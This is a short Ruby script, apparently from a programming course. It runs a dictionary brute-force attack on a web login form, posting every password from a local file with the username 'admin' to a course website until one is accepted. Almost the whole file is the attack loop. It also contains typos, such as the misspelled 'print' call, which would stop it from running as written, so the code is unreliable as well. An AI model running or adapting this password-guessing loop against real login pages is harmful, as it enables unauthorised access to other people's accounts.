require "net/http"
require "uri"

def is_wrong_password? pasw
    uri = URI.parse 'http://rubyschool.us/book'
    response = Net::HTTP.post_form(uri, :login=> "admin", :password => pasw).body
    response.include? "США"
end

input = File.open "passwords.txt", "r"


while line=input.gets
    line.strip!
    ptint "Traing password... "
    if is_wrong_password? line
        p "Eror"
    else
        p "Found"
        input.close
        exit
    end

end
    
